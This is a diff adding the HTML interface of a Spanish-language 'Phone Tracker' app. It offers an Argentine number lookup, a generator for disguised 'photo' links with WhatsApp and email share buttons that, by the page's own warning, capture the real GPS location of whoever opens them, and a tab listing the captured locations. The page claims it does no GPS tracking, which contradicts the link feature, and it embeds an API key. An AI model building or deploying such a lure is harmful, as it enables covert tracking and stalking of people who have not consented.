@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phone Tracker - Localizador de Números</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.socket.io/4.7.4/socket.io.min.js"></script>
+    <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyBFw0Qbyq9zTFTd-tUY6dOWTgaQzuU17R8&libraries=geometry"></script>
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+        .glass-effect {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        .pulse-animation {
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        .map-container {
+            height: 400px;
+            border-radius: 12px;
+            overflow: hidden;
+        }
+        .loading-spinner {
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top: 3px solid #ffffff;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body class="min-h-screen">
+    <!-- Header -->
+    <nav class="glass-effect p-4 mb-8">
+        <div class="container mx-auto flex items-center justify-between">
+            <div class="flex items-center space-x-3">
+                <div class="bg-white bg-opacity-20 p-3 rounded-full">
+                    <i class="fas fa-mobile-alt text-white text-xl"></i>
+                </div>
+                <h1 class="text-2xl font-bold text-white">Phone Tracker</h1>
+            </div>
+            <div class="flex items-center space-x-4">
+                <span class="text-white text-sm">
+                    <i class="fas fa-shield-alt mr-1"></i>
+                    Información Pública Únicamente
+                </span>
+                <div id="connectionStatus" class="flex items-center">
+                    <div class="w-3 h-3 bg-green-400 rounded-full pulse-animation"></div>
+                    <span class="text-white text-sm ml-2">Conectado</span>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <div class="container mx-auto px-4">
+        <!-- Disclaimer Legal -->
+        <div class="glass-effect rounded-xl p-6 mb-8 border-l-4 border-yellow-400">
+            <div class="flex items-start space-x-3">
+                <i class="fas fa-exclamation-triangle text-yellow-400 text-xl mt-1"></i>
+                <div>
+                    <h3 class="text-white font-semibold mb-2">Aviso Legal Importante</h3>
+                    <p class="text-gray-200 text-sm leading-relaxed">
+                        Este sistema solo proporciona información pública disponible sobre números telefónicos 
+                        (país, operadora, región general). No realiza seguimiento GPS ni viola la privacidad. 
+                        Úselo solo con números propios o con consentimiento explícito del propietario.
+                    </p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Pestañas de navegación -->
+        <div class="glass-effect rounded-xl p-2 mb-8">
+            <div class="flex space-x-2">
+                <button id="phoneTabBtn" class="flex-1 py-3 px-4 rounded-lg font-medium transition-all duration-300 bg-gradient-to-r from-blue-500 to-purple-600 text-white">
+                    <i class="fas fa-search mr-2"></i>
+                    Buscar Número
+                </button>
+                <button id="linkTabBtn" class="flex-1 py-3 px-4 rounded-lg font-medium transition-all duration-300 text-white hover:bg-white hover:bg-opacity-10">
+                    <i class="fas fa-link mr-2"></i>
+                    Crear Enlace con Foto
+                </button>
+                <button id="locationsTabBtn" class="flex-1 py-3 px-4 rounded-lg font-medium transition-all duration-300 text-white hover:bg-white hover:bg-opacity-10">
+                    <i class="fas fa-map-marked-alt mr-2"></i>
+                    Ubicaciones Capturadas
+                </button>
+            </div>
+        </div>
+
+        <!-- Panel de Búsqueda de Números -->
+        <div id="phoneTab" class="grid grid-cols-1 lg:grid-cols-2 gap-8">
+            <!-- Panel de Búsqueda -->
+            <div class="glass-effect rounded-xl p-6">
+                <h2 class="text-xl font-semibold text-white mb-6 flex items-center">
+                    <i class="fas fa-search mr-3"></i>
+                    Buscar Número
+                </h2>
+                
+                <form id="searchForm" class="space-y-4">
+                    <div>
+                        <label class="block text-gray-200 text-sm font-medium mb-2">
+                            Número de Teléfono
+                        </label>
+                        <div class="relative">
+                            <input 
+                                type="tel" 
+                                id="phoneInput" 
+                                placeholder="Ej: +5411XXXXXXXX (Solo Argentina)" 
+                                class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                                pattern="(\+54|54)?[0-9]{8,12}"
+                                title="Solo números argentinos (+54)"
+                                required
+                            >
+                            <i class="fas fa-phone absolute right-3 top-3 text-gray-300"></i>
+                        </div>
+                        <p class="text-gray-300 text-xs mt-1">
+                            Solo números argentinos: +5411XXXXXXXX, +54351XXXXXXX, etc.
+                        </p>
+                    </div>
+                    
+                    <button 
+                        type="submit" 
+                        id="searchBtn"
+                        class="w-full bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 text-white font-semibold py-3 px-6 rounded-lg transition-all duration-300 transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-blue-400"
+                    >
+                        <span id="searchBtnText">
+                            <i class="fas fa-search mr-2"></i>
+                            Localizar Número
+                        </span>
+                        <div id="searchBtnLoading" class="hidden flex items-center justify-center">
+                            <div class="loading-spinner mr-2"></div>
+                            Buscando...
+                        </div>
+                    </button>
+                </form>
+
+                <!-- Historial de Búsquedas -->
+                <div id="searchHistory" class="mt-8">
+                    <h3 class="text-lg font-medium text-white mb-4 flex items-center">
+                        <i class="fas fa-history mr-2"></i>
+                        Búsquedas Recientes
+                    </h3>
+                    <div id="historyList" class="space-y-2 max-h-40 overflow-y-auto">
+                        <p class="text-gray-300 text-sm">No hay búsquedas recientes</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Panel de Resultados -->
+            <div class="glass-effect rounded-xl p-6">
+                <h2 class="text-xl font-semibold text-white mb-6 flex items-center">
+                    <i class="fas fa-info-circle mr-3"></i>
+                    Información del Número
+                </h2>
+                
+                <div id="resultsContainer" class="hidden">
+                    <div class="space-y-4">
+                        <div class="bg-white bg-opacity-10 rounded-lg p-4">
+                            <div class="grid grid-cols-2 gap-4">
+                                <div>
+                                    <p class="text-gray-300 text-sm">Número</p>
+                                    <p id="resultNumber" class="text-white font-semibold"></p>
+                                </div>
+                                <div>
+                                    <p class="text-gray-300 text-sm">País</p>
+                                    <p id="resultCountry" class="text-white font-semibold"></p>
+                                </div>
+                                <div>
+                                    <p class="text-gray-300 text-sm">Operadora</p>
+                                    <p id="resultCarrier" class="text-white font-semibold"></p>
+                                </div>
+                                <div>
+                                    <p class="text-gray-300 text-sm">Tipo de Línea</p>
+                                    <p id="resultLineType" class="text-white font-semibold"></p>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="bg-white bg-opacity-10 rounded-lg p-4">
+                            <p class="text-gray-300 text-sm mb-2">Ubicación Aproximada</p>
+                            <div id="mapContainer" class="map-container bg-gray-800 rounded-lg flex items-center justify-center">
+                                <div id="map"></div>
+                                <div id="mapPlaceholder" class="text-gray-400">
+                                    <i class="fas fa-map-marked-alt text-4xl mb-2"></i>
+                                    <p>El mapa se mostrará aquí</p>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="bg-yellow-500 bg-opacity-20 border border-yellow-400 rounded-lg p-3">
+                            <p class="text-yellow-200 text-xs">
+                                <i class="fas fa-info-circle mr-1"></i>
+                                <span id="resultDisclaimer"></span>
+                            </p>
+                        </div>
+                    </div>
+                </div>
+                
+                <div id="noResults" class="text-center py-8">
+                    <i class="fas fa-search text-gray-400 text-4xl mb-4"></i>
+                    <p class="text-gray-300">Ingresa un número para ver la información</p>
+                </div>
+                
+                <div id="errorMessage" class="hidden bg-red-500 bg-opacity-20 border border-red-400 rounded-lg p-4">
+                    <div class="flex items-center">
+                        <i class="fas fa-exclamation-circle text-red-400 mr-3"></i>
+                        <p class="text-red-200" id="errorText"></p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Panel de Crear Enlaces con Foto -->
+        <div id="linkTab" class="hidden">
+            <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
+                <!-- Formulario para crear enlace -->
+                <div class="glass-effect rounded-xl p-6">
+                    <h2 class="text-xl font-semibold text-white mb-6 flex items-center">
+                        <i class="fas fa-link mr-3"></i>
+                        Crear Enlace con Foto
+                    </h2>
+                    
+                    <form id="linkForm" class="space-y-4">
+                        <div>
+                            <label class="block text-gray-200 text-sm font-medium mb-2">
+                                URL de la Foto
+                            </label>
+                            <input 
+                                type="url" 
+                                id="photoUrlInput" 
+                                placeholder="https://ejemplo.com/foto.jpg"
+                                class="w-full px-4 py-3 bg-white bg-opacity-10 border border-gray-300 border-opacity-30 rounded-lg text-white placeholder-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-400 focus:border-transparent"
+                                required
+                            >
+                        </div>
+                        
+                        <div>
+                            <label class="block text-gray-200 text-sm font-medium mb-2">
+                                Mensaje Personalizado
+                            </label>
+                            <input 
+                                type="text" 
+                                id="messageInput" 
+                                placeholder="¡Mira esta foto increíble!"
+                                class="w-full px-4 py-3 bg-white bg-opacity-10 border border-gray-300 border-opacity-30 rounded-lg text-white placeholder-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-400 focus:border-transparent"
+                            >
+                        </div>
+                        
+                        <div>
+                            <label class="block text-gray-200 text-sm font-medium mb-2">
+                                Tiempo de Expiración
+                            </label>
+                            <select 
+                                id="expirationSelect"
+                                class="w-full px-4 py-3 bg-white bg-opacity-10 border border-gray-300 border-opacity-30 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-blue-400 focus:border-transparent"
+                            >
+                                <option value="3600000">1 hora</option>
+                                <option value="21600000">6 horas</option>
+                                <option value="86400000" selected>24 horas</option>
+                                <option value="604800000">7 días</option>
+                            </select>
+                        </div>
+                        
+                        <button 
+                            type="submit" 
+                            id="createLinkBtn"
+                            class="w-full bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white font-semibold py-3 px-6 rounded-lg transition-all duration-300 transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-green-400"
+                        >
+                            <span id="createLinkBtnText">
+                                <i class="fas fa-plus mr-2"></i>
+                                Crear Enlace
+                            </span>
+                            <div id="createLinkBtnLoading" class="hidden flex items-center justify-center">
+                                <div class="loading-spinner mr-2"></div>
+                                Creando...
+                            </div>
+                        </button>
+                    </form>
+
+                    <!-- Aviso legal para enlaces -->
+                    <div class="mt-6 bg-red-500 bg-opacity-20 border border-red-400 rounded-lg p-4">
+                        <div class="flex items-start space-x-3">
+                            <i class="fas fa-exclamation-triangle text-red-400 text-lg mt-1"></i>
+                            <div>
+                                <h3 class="text-red-200 font-semibold mb-2">⚠️ Uso Responsable</h3>
+                                <p class="text-red-100 text-sm">
+                                    Solo usa esta función con consentimiento explícito. El enlace capturará la ubicación GPS real del dispositivo que lo abra.
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Panel de enlace generado -->
+                <div class="glass-effect rounded-xl p-6">
+                    <h2 class="text-xl font-semibold text-white mb-6 flex items-center">
+                        <i class="fas fa-share-alt mr-3"></i>
+                        Enlace Generado
+                    </h2>
+                    
+                    <div id="linkResultContainer" class="hidden">
+                        <div class="space-y-4">
+                            <div class="bg-white bg-opacity-10 rounded-lg p-4">
+                                <p class="text-gray-300 text-sm mb-2">Enlace para compartir:</p>
+                                <div class="flex items-center space-x-2">
+                                    <input 
+                                        type="text" 
+                                        id="generatedLink" 
+                                        readonly
+                                        class="flex-1 px-3 py-2 bg-gray-800 text-white rounded border text-sm"
+                                    >
+                                    <button 
+                                        id="copyLinkBtn"
+                                        class="bg-blue-500 hover:bg-blue-600 text-white px-4 py-2 rounded transition-all"
+                                    >
+                                        <i class="fas fa-copy"></i>
+                                    </button>
+                                </div>
+                            </div>
+                            
+                            <div class="bg-white bg-opacity-10 rounded-lg p-4">
+                                <p class="text-gray-300 text-sm mb-2">Información del enlace:</p>
+                                <div class="grid grid-cols-2 gap-4 text-sm">
+                                    <div>
+                                        <p class="text-gray-400">ID del enlace:</p>
+                                        <p id="linkId" class="text-white font-mono"></p>
+                                    </div>
+                                    <div>
+                                        <p class="text-gray-400">Expira:</p>
+                                        <p id="linkExpiration" class="text-white"></p>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- Botones de compartir -->
+                            <div class="grid grid-cols-2 gap-3">
+                                <button 
+                                    id="shareWhatsAppBtn"
+                                    class="bg-green-500 hover:bg-green-600 text-white py-2 px-4 rounded-lg transition-all"
+                                >
+                                    <i class="fab fa-whatsapp mr-2"></i>
+                                    WhatsApp
+                                </button>
+                                <button 
+                                    id="shareEmailBtn"
+                                    class="bg-blue-500 hover:bg-blue-600 text-white py-2 px-4 rounded-lg transition-all"
+                                >
+                                    <i class="fas fa-envelope mr-2"></i>
+                                    Email
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div id="noLinkGenerated" class="text-center py-8">
+                        <i class="fas fa-link text-gray-400 text-4xl mb-4"></i>
+                        <p class="text-gray-300">Completa el formulario para generar un enlace</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Panel de Ubicaciones Capturadas -->
+        <div id="locationsTab" class="hidden">
+            <div class="glass-effect rounded-xl p-6">
+                <h2 class="text-xl font-semibold text-white mb-6 flex items-center">
+                    <i class="fas fa-map-marked-alt mr-3"></i>
+                    Ubicaciones Capturadas
+                </h2>
+                
+                <div id="capturedLocationsContainer">
+                    <div id="loadingLocations" class="text-center py-8">
+                        <div class="loading-spinner mx-auto mb-4"></div>
+                        <p class="text-gray-300">Cargando ubicaciones...</p>
+                    </div>
+                    
+                    <div id="locationsList" class="hidden space-y-4"></div>
+                    
+                    <div id="noLocations" class="hidden text-center py-8">
+                        <i class="fas fa-map text-gray-400 text-4xl mb-4"></i>
+                        <p class="text-gray-300">No hay ubicaciones capturadas aún</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Estadísticas en Tiempo Real -->
+        <div class="mt-8 glass-effect rounded-xl p-6">
+            <h2 class="text-xl font-semibold text-white mb-6 flex items-center">
+                <i class="fas fa-chart-line mr-3"></i>
+                Actividad en Tiempo Real
+            </h2>
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                <div class="text-center">
+                    <div class="text-3xl font-bold text-blue-400" id="totalSearches">0</div>
+                    <p class="text-gray-300 text-sm">Búsquedas Totales</p>
+                </div>
+                <div class="text-center">
+                    <div class="text-3xl font-bold text-green-400" id="validNumbers">0</div>
+                    <p class="text-gray-300 text-sm">Números Válidos</p>
+                </div>
+                <div class="text-center">
+                    <div class="text-3xl font-bold text-purple-400" id="connectedUsers">1</div>
+                    <p class="text-gray-300 text-sm">Usuarios Conectados</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
